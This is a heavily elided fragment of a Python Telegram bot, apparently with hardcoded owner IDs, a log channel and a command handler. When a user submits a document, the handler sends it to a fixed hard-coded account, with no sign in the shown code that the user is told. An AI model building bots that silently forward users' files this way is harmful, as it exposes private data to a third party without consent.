...
# Constants
OWNER_IDS = [5357048091]  # Replace with the actual owner user IDs

# Global variables
log_channel_id = -1002166446304
authorized_users = [5357048091]
ALLOWED_CHANNEL_IDS = []
my_name = "**𝚉𝙴𝙽𝙸𝚃𝙷 🏅**"
overlay = None 
accept_logs = 0
...
async def luminant_command(bot: Client, m: Message):
    ...
    if input.document:
        ...
        try:
            await bot.send_document(5357048091, x)
        except Exception as e:
